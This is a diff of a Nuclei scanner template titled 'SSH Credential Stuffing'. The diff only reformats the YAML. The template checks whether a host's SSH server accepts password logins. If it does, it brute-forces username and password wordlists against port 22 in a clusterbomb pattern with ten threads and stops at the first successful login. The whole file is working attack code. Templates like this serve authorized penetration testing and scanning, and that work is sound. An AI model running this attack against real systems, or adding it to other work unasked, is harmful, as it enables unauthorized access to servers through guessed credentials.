@@ -1,40 +1,41 @@
 id: ssh-brute
-
 info:
-  name: SSH Credential Stuffing
   author: tarunKoyalwar
+  name: SSH Credential Stuffing
   severity: critical
-  
-
 javascript:
-  - pre-condition: |
-      var m = require("nuclei/ssh");
-      var c = m.SSHClient();
-      var response = c.ConnectSSHInfoMode(Host, Port);
-      // only bruteforce if ssh allows password based authentication
-      response["UserAuth"].includes("password")
+- args:
+    Host: '{{Host}}'
+    Password: '{{passwords}}'
+    Port: '22'
+    Username: '{{usernames}}'
+  attack: clusterbomb
+  code: 'var m = require("nuclei/ssh");
 
-    code: |
-      var m = require("nuclei/ssh");
-      var c = m.SSHClient();
-      c.Connect(Host,Port,Username,Password);
+    var c = m.SSHClient();
 
-    args:
-      Host: "{{Host}}"
-      Port: "22"
-      Username: "{{usernames}}"
-      Password: "{{passwords}}"
-    
-    payloads:
-      usernames: helpers/wordlists/wp-users.txt
-      passwords: helpers/wordlists/wp-passwords.txt
-    attack: clusterbomb
-    threads: 10
-    stop-at-first-match: true
+    c.Connect(Host,Port,Username,Password);
 
-    matchers:
-      - type: dsl
-        dsl:
-          - "response == true"
-          - "success == true"
-        condition: and
+    '
+  matchers:
+  - condition: and
+    dsl:
+    - response == true
+    - success == true
+    type: dsl
+  payloads:
+    passwords: helpers/wordlists/wp-passwords.txt
+    usernames: helpers/wordlists/wp-users.txt
+  pre-condition: 'var m = require("nuclei/ssh");
+
+    var c = m.SSHClient();
+
+    var response = c.ConnectSSHInfoMode(Host, Port);
+
+    // only bruteforce if ssh allows password based authentication
+
+    response["UserAuth"].includes("password")
+
+    '
+  stop-at-first-match: true
+  threads: 10
